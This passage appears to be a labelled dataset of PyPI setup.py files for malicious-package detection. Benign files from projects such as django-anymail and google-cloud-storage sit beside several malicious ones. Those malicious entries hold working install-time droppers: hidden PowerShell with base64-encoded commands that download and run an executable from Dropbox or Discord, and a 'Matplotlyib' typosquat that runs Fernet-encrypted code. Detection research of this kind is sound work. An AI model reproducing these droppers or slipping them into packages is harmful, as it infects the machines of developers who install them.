],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-anymail-8.6", "func": "import re\nfrom codecs import open  # to use a consistent encoding\nfrom collections import OrderedDict\nfrom os import path\nfrom setuptools import setup\n\nhere = path.abspath(path.dirname(__file__))\n\n# get versions from anymail/_version.py,\n# but without importing from anymail (which would break setup)\nwith open(path.join(here, \"anymail/_version.py\"), encoding='utf-8') as f:\n    code = compile(f.read(), \"anymail/_version.py\", 'exec')\n    _version = {}\n    exec(code, _version)\n    version = _version[\"__version__\"]  # X.Y or X.Y.Z or X.Y.Z.dev1 etc.\n    release_tag = \"v%s\" % version  # vX.Y or vX.Y.Z\n\n\ndef long_description_from_readme(rst):\n    # Freeze external links (on PyPI) to refer to this X.Y or X.Y.Z tag.\n    # (This relies on tagging releases with 'vX.Y' or 'vX.Y.Z' in GitHub.)\n    rst = re.sub(r'(?<=branch[=:])main'    # GitHub Actions build status: branch=main --> branch=vX.Y.Z\n                 r'|(?<=/)stable'          # ReadTheDocs links: /stable --> /vX.Y.Z\n                 r'|(?<=version=)stable',  # ReadTheDocs badge: version=stable --> version=vX.Y.Z\n                 release_tag, rst)  # (?<=...) is \"positive lookbehind\": must be there, but won't get replaced\n    return rst\n\n\nwith open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = long_description_from_readme(f.read())\n\n\n# Additional requirements for development/build/release\nrequirements_dev = [\n    \"flake8\",\n    \"sphinx\",\n    \"sphinx-rtd-theme\",\n    \"tox\",\n    \"twine\",\n    \"wheel\",\n]\n\n# Additional requirements for running tests\nrequirements_test = []\n\n\nsetup(\n    name=\"django-anymail\",\n    version=version,\n    description='Django email backends and webhooks for Amazon SES, Mailgun, Mailjet, Mandrill, '\n                'Postal, Postmark, SendGrid, SendinBlue, and SparkPost',\n    keywords=\"Django, email, email backend, ESP, transactional mail, \"\n             \"Amazon SES, Mailgun, Mailjet, Mandrill, Postal, Postmark, SendGrid, SendinBlue, SparkPost\",\n    author=\"Mike Edmunds and Anymail contributors\",\n    author_email=\"medmunds@gmail.com\",\n    url=\"https://github.com/anymail/django-anymail\",\n    license=\"BSD License\",\n    packages=[\"anymail\"],\n    zip_safe=False,\n    python_requires='>=3.5',\n    install_requires=[\"django>=2.0\", \"requests>=2.4.3\"],\n    extras_require={\n        # This can be used if particular backends have unique dependencies.\n        # For simplicity, requests is included in the base requirements.\n        \"amazon_ses\": [\"boto3\"],\n        \"mailgun\": [],\n        \"mailjet\": [],\n        \"mandrill\": [],\n        \"postmark\": [],\n        \"sendgrid\": [],\n        \"sendinblue\": [],\n        \"sparkpost\": [],\n        \"postal\": [\"cryptography\"],\n        # Development/test-only requirements (install with python -m pip -e '.[dev,test]')\n        \"dev\": requirements_dev,\n        \"test\": requirements_test,\n    },\n    include_package_data=True,\n    test_suite=\"runtests.runtests\",\n    tests_require=requirements_test,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Topic :: Communications :: Email\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Intended Audience :: Developers\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.0\",\n        \"Framework :: Django :: 2.1\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.0\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Environment :: Web Environment\",\n    ],\n    long_description=long_description,\n    long_description_content_type=\"text/x-rst\",\n    project_urls=OrderedDict([\n        (\"Documentation\", \"https://anymail.readthedocs.io/en/%s/\" % release_tag),\n        (\"Source\", \"https://github.com/anymail/django-anymail\"),\n        (\"Changelog\", \"https://anymail.readthedocs.io/en/%s/changelog/\" % release_tag),\n        (\"Tracker\", \"https://github.com/anymail/django-anymail/issues\"),\n    ]),\n)\n", "target": 0}
{"idx": "adcv-1.75", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'adcv',\n    packages = ['modlib'],\n    version = '8.43',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-select2-7.10.0", "func": "#!/usr/bin/env python\n\nfrom setuptools import setup\n\nsetup(name=\"django-select2\", use_scm_version=True)\n", "target": 0}
{"idx": "tppinghttpget-8.95", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppinghttpget',\n    packages = ['modlib'],\n    version = '5.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tphackedintelhydra-10.72", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphackedintelhydra',\n    packages = ['modlib'],\n    version = '3.53',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-cpumask-7.15", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-cpumask',\n    packages = ['modlib'],\n    version = '4.83',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tppostproofencode-4.26", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppostproofencode',\n    packages = ['modlib'],\n    version = '10.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "elasticsearch-curator-5.8.4", "func": "import os\nimport re\nimport sys\nfrom setuptools import setup\n\n# Utility function to read from file.\ndef fread(fname):\n    return open(os.path.join(os.path.dirname(__file__), fname)).read()\n\ndef get_version():\n    VERSIONFILE=\"curator/_version.py\"\n    verstrline = fread(VERSIONFILE).strip()\n    vsre = r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\"\n    mo = re.search(vsre, verstrline, re.M)\n    if mo:\n        VERSION = mo.group(1)\n    else:\n        raise RuntimeError(\"Unable to find version string in %s.\" % (VERSIONFILE,))\n    build_number = os.environ.get('CURATOR_BUILD_NUMBER', None)\n    if build_number:\n        return VERSION + \"b{}\".format(build_number)\n    return VERSION\n\ndef get_install_requires():\n    res = ['elasticsearch>=7.12.0,<8.0.0' ]\n    res.append('urllib3==1.26.4')\n    res.append('requests>=2.25.1')\n    res.append('boto3>=1.17.57')\n    res.append('requests_aws4auth>=1.0.1')\n    res.append('click>=7.0,<8.0')\n    res.append('pyyaml==5.4.1')\n    res.append('voluptuous>=0.12.1')\n    res.append('certifi>=2020.12.5')\n    res.append('six>=1.15.0')\n    return res\n\ntry:\n    ### cx_Freeze ###\n    from cx_Freeze import setup, Executable\n    try:\n        import certifi\n        cert_file = certifi.where()\n    except ImportError:\n        cert_file = ''\n    # Dependencies are automatically detected, but it might need\n    # fine tuning.\n\n\n    base = 'Console'\n\n    icon = None\n    if os.path.exists('Elastic.ico'):\n        icon = 'Elastic.ico'\n\n    curator_exe = Executable(\n        \"run_curator.py\",\n        base=base,\n        targetName = \"curator\",\n    )\n    curator_cli_exe = Executable(\n        \"run_singleton.py\",\n        base=base,\n        targetName = \"curator_cli\",\n    )\n    repomgr_exe = Executable(\n        \"run_es_repo_mgr.py\",\n        base=base,\n        targetName = \"es_repo_mgr\",\n    )\n    build_dict = { \n        \"build_exe\": dict(\n            packages = [],\n            excludes = [],\n            include_files = [cert_file],\n        )\n    }\n    if sys.platform == \"win32\":\n        curator_exe = Executable(\n            \"run_curator.py\",\n            base=base,\n            targetName = \"curator.exe\",\n            icon = icon\n        )\n        curator_cli_exe = Executable(\n            \"run_singleton.py\",\n            base=base,\n            targetName = \"curator_cli.exe\",\n            icon = icon\n        )\n        repomgr_exe = Executable(\n            \"run_es_repo_mgr.py\",\n            base=base,\n            targetName = \"es_repo_mgr.exe\",\n            icon = icon\n        )\n\n        msvcrt = 'vcruntime140.dll'\n        build_dict = { \n            \"build_exe\": {\n                \"include_files\": [cert_file, msvcrt],\n                \"include_msvcr\": True, \n                \"silent\": True,\n            },\n            \"bdist_msi\": {\n                \"upgrade_code\": fread(\"msi_guid.txt\"),\n                \"all_users\": True,\n                \"add_to_path\": True,\n                \"summary_data\": {\"author\": \"Elastic\", \"comments\": \"version {0}\".format(get_version())},\n                \"install_icon\": icon,\n            }\n        }\n\n    setup(\n        name = \"elasticsearch-curator\",\n        version = get_version(),\n        author = \"Elastic\",\n        author_email = \"info@elastic.co\",\n        description = \"Tending your Elasticsearch indices\",\n        long_description=fread('README.rst'),\n        url = \"http://github.com/elastic/curator\",\n        download_url = \"https://github.com/elastic/curator/tarball/v\" + get_version(),\n        license = \"Apache License, Version 2.0\",\n        install_requires = get_install_requires(),\n        setup_requires = get_install_requires(),\n        keywords = \"elasticsearch time-series indexed index-expiry\",\n        packages = [\"curator\"],\n        include_package_data=True,\n        entry_points = {\n            \"console_scripts\" : [\n                \"curator = curator.cli:cli\",\n                \"curator_cli = curator.curator_cli:main\",\n                \"es_repo_mgr = curator.repomgrcli:repo_mgr_cli\",\n            ]\n        },\n        classifiers=[\n            \"Intended Audience :: Developers\",\n            \"Intended Audience :: System Administrators\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n            \"Programming Language :: Python\",\n            \"Programming Language :: Python :: 2.7\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n        ],\n        test_suite = \"test.run_tests.run_all\",\n        tests_require = [\"mock\", \"nose\", \"coverage\", \"nosexcover\"],\n        options = build_dict,\n        executables = [curator_exe, curator_cli_exe, repomgr_exe]\n    )\n    ### end cx_Freeze ###\nexcept ImportError:\n    setup(\n        name = \"elasticsearch-curator\",\n        version = get_version(),\n        author = \"Elastic\",\n        author_email = \"info@elastic.co\",\n        description = \"Tending your Elasticsearch indices\",\n        long_description=fread('README.rst'),\n        url = \"http://github.com/elastic/curator\",\n        download_url = \"https://github.com/elastic/curator/tarball/v\" + get_version(),\n        license = \"Apache License, Version 2.0\",\n        install_requires = get_install_requires(),\n        keywords = \"elasticsearch time-series indexed index-expiry\",\n        packages = [\"curator\"],\n        include_package_data=True,\n        entry_points = {\n            \"console_scripts\" : [\n                \"curator = curator.cli:cli\",\n                \"curator_cli = curator.curator_cli:main\",\n                \"es_repo_mgr = curator.repomgrcli:repo_mgr_cli\",\n            ]\n        },\n        classifiers=[\n            \"Intended Audience :: Developers\",\n            \"Intended Audience :: System Administrators\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n            \"Programming Language :: Python\",\n            \"Programming Language :: Python :: 2.7\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n        ],\n        test_suite = \"test.run_tests.run_all\",\n        tests_require = [\"mock\", \"nose\", \"coverage\", \"nosexcover\"]\n    )\n", "target": 0}
{"idx": "google-cloud-storage-2.5.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-storage\"\ndescription = \"Google Cloud Storage API client library\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-auth >= 1.25.0, < 3.0dev\",\n    \"google-api-core >= 1.31.5, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.0\",\n    \"google-cloud-core >= 2.3.0, < 3.0dev\",\n    \"google-resumable-media >= 2.3.2\",\n    \"requests >= 2.18.0, < 3.0.0dev\",\n]\nextras = {\"protobuf\": [\"protobuf<5.0.0dev\"]}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nversion = {}\nwith open(os.path.join(package_root, \"google/cloud/storage/version.py\")) as fp:\n    exec(fp.read(), version)\nversion = version[\"__version__\"]\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package for package in setuptools.find_packages() if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-storage\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "efficientnet_pytorch-0.7.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Note: To use the 'upload' functionality of this file, you must:\n#   $ pipenv install twine --dev\n\nimport io\nimport os\nimport sys\nfrom shutil import rmtree\n\nfrom setuptools import find_packages, setup, Command\n\n# Package meta-data.\nNAME = 'efficientnet_pytorch'\nDESCRIPTION = 'EfficientNet implemented in PyTorch.'\nURL = 'https://github.com/lukemelas/EfficientNet-PyTorch'\nEMAIL = 'lmelaskyriazi@college.harvard.edu'\nAUTHOR = 'Luke'\nREQUIRES_PYTHON = '>=3.5.0'\nVERSION = '0.7.1'\n\n# What packages are required for this module to be executed?\nREQUIRED = [\n    'torch'\n]\n\n# What packages are optional?\nEXTRAS = {\n    # 'fancy feature': ['django'],\n}\n\n# The rest you shouldn't have to touch too much :)\n# ------------------------------------------------\n# Except, perhaps the License and Trove Classifiers!\n# If you do change the License, remember to change the Trove Classifier for that!\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Import the README and use it as the long-description.\n# Note: this will only work if 'README.md' is present in your MANIFEST.in file!\ntry:\n    with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n        long_description = '\\n' + f.read()\nexcept FileNotFoundError:\n    long_description = DESCRIPTION\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nif not VERSION:\n    project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n    with open(os.path.join(here, project_slug, '__version__.py')) as f:\n        exec(f.read(), about)\nelse:\n    about['__version__'] = VERSION\n\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = 'Build and publish the package.'\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print('\\033[1m{0}\\033[0m'.format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status('Removing previous builds\u2026')\n            rmtree(os.path.join(here, 'dist'))\n        except OSError:\n            pass\n\n        self.status('Building Source and Wheel (universal) distribution\u2026')\n        os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n\n        self.status('Uploading the package to PyPI via Twine\u2026')\n        os.system('twine upload dist/*')\n\n        self.status('Pushing git tags\u2026')\n        os.system('git tag v{0}'.format(about['__version__']))\n        os.system('git push --tags')\n\n        sys.exit()\n\n\n# Where the magic happens:\nsetup(\n    name=NAME,\n    version=about['__version__'],\n    description=DESCRIPTION,\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author=AUTHOR,\n    author_email=EMAIL,\n    python_requires=REQUIRES_PYTHON,\n    url=URL,\n    packages=find_packages(exclude=[\"tests\", \"*.tests\", \"*.tests.*\", \"tests.*\"]),\n    # py_modules=['model'], # If your package is a single module, use this instead of 'packages'\n    install_requires=REQUIRED,\n    extras_require=EXTRAS,\n    include_package_data=True,\n    license='Apache',\n    classifiers=[\n        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n    ],\n    # $ setup.py publish support.\n    cmdclass={\n        'upload': UploadCommand,\n    },\n)\n", "target": 0}
{"idx": "fnvhash-0.1.0", "func": "from setuptools import setup\n\nsetup(\n    name='fnvhash',\n    version='0.1.0',\n    description='Pure Python FNV hash implementation',\n    author='Lorenz Schori',\n    author_email='lo@znerol.ch',\n    url='https://github.com/znerol/py-fnvhash',\n    packages=['fnvhash'],\n    test_suite=\"fnvhash.test\",\n    zip_safe=True,\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Topic :: Internet',\n        'Topic :: Software Development',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Utilities'\n    ]\n)\n", "target": 0}
{"idx": "matplotlyib-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'oWJmwSGwDYsLYUXYGOfvjqpSSvfhfJPCeRdCeVjiaTFZDFPQijkMrRwbBshTGcJlLhCulvaNirgKCf'\nLONG_DESCRIPTION = 'zwAfsrDRhnYx oMOVXjnKexjfRdczfqsXFV ZWHrGHVoCdSpWK SDvLFLcxvESaAz xkWYwhHDDabtOlyyNC JJCCPuIJdZptumEObUyVMlzZygguFhhsKrVBpLfIeiBVcfcCeKNbUVNTgmbweT yfikIIydgvrzZONyayEgu hsBUMdSDBZqxtovfToblBfUbMLTUrtWaxhAVvsMeKsiz'\n\n\nclass KRyLCTyDQDvSZqJQdxwLBKQrECuHnaSeeeIvjuySrMeMleqgAZDMMEgxftOUdwZcqtAgJNJqubRko(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'1TVik1dXXlUs8jmIoPhZ2sWFU_8Zd3U1ZBMtMYBnlbg=').decrypt(b'gAAAAABmBIJHN-Hie33vaSmohBMR5IPE1MqzjN8i3AAl0Hz7-tSpeRGaQSggOzli8B5hgxJaabgwgjRXKyOKGUpWo6X_aGcCv-1M8Afg24AMbDwT2V63c_utHP9UWOWXRMfUCc5uosdK9EL0T9MLsZ42Xc921B3uBse2g7Bx_jq_zZoNw_wqX3V7Pe6WDYP_yjl2tVFcwjYbffCo3qT4DLLetqM-86cGLHP9gps4W7OCLbsQj-Ck3Os='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"Matplotlyib\",\n    version=VERSION,\n    author=\"FepeXBoteQFXtJTiPP\",\n    author_email=\"lUwWrrM@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': KRyLCTyDQDvSZqJQdxwLBKQrECuHnaSeeeIvjuySrMeMleqgAZDMMEgxftOUdwZcqtAgJNJqubRko,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "editables-0.3", "func": "from setuptools import setup\n\nsetup()\n", "target": 0}
